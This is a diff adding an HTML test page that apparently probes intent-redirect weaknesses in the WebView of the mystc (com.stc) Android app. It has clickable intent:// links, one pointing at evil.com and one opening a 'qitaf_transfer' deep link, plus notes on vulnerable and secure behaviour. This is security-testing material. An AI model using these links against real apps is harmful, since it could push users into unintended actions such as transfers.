@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Intent Redirect Test</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        p {
+            color: #666;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        .test-link {
+            display: block;
+            padding: 15px 20px;
+            margin: 12px 0;
+            background: #ff4757;
+            color: white;
+            text-decoration: none;
+            border-radius: 8px;
+            font-weight: 600;
+            text-align: center;
+            transition: all 0.3s;
+            border: none;
+            font-size: 16px;
+        }
+        .test-link:active {
+            transform: scale(0.98);
+            background: #ee5a6f;
+        }
+        .warning {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 12px;
+            margin: 20px 0;
+            border-radius: 4px;
+            color: #856404;
+            font-size: 14px;
+        }
+        .success {
+            background: #d4edda;
+            border-left: 4px solid #28a745;
+            padding: 12px;
+            margin: 20px 0;
+            border-radius: 4px;
+            color: #155724;
+            font-size: 14px;
+        }
+        .code {
+            background: #f4f4f4;
+            padding: 8px 12px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 13px;
+            overflow-x: auto;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎯 WebView Intent Redirect Tests</h1>
+        <p>These tests demonstrate intent redirection vulnerabilities in WebView implementations.</p>
+
+        <div class="success">
+            ✅ Page loaded successfully via HTTPS
+        </div>
+
+        <h2 style="margin-top: 20px; font-size: 18px; color: #333;">Click tests below:</h2>
+
+        <a href="intent://example.com#Intent;scheme=https;S.browser_fallback_url=https://google.com;end" class="test-link">
+            TEST 1: Basic Intent Redirect
+        </a>
+
+        <a href="intent://evil.com#Intent;scheme=https;component=com.android.chrome/com.google.android.apps.chrome.Main;end" class="test-link">
+            TEST 2: Launch Chrome via Intent
+        </a>
+
+        <a href="intent://qitaf_transfer#Intent;scheme=mystc;package=com.stc;end" class="test-link">
+            TEST 3: Launch mystc App
+        </a>
+
+        <a href="tel:+966500000000" class="test-link">
+            TEST 4: Phone Dialer
+        </a>
+
+        <a href="intent://maps.google.com#Intent;scheme=https;package=com.google.android.apps.maps;end" class="test-link">
+            TEST 5: Launch Google Maps
+        </a>
+
+        <div class="warning">
+            ⚠️ <strong>Expected behavior:</strong><br>
+            • Vulnerable WebView: Automatically launches intents without confirmation<br>
+            • Secure WebView: Blocks or requires user confirmation
+        </div>
+
+        <h3 style="margin-top: 30px; font-size: 16px; color: #333;">Tested Intent URLs:</h3>
+        <div class="code">intent://example.com#Intent;scheme=https;end</div>
+        <div class="code">intent://qitaf_transfer#Intent;scheme=mystc;package=com.stc;end</div>
+
+        <p style="margin-top: 20px; font-size: 14px; color: #999;">
+            Security Test - mystc WebView Vulnerability Assessment
+        </p>
+    </div>
+
+    <script>
+        // Log all clicks for debugging
+        document.querySelectorAll('.test-link').forEach(link => {
+            link.addEventListener('click', function(e) {
+                console.log('[TEST] Clicked:', this.href);
+                console.log('[TEST] Time:', new Date().toISOString());
+            });
+        });
+
+        // Display when page loaded
+        console.log('[INFO] Test page loaded at:', new Date().toISOString());
+    </script>
+</body>
+</html>
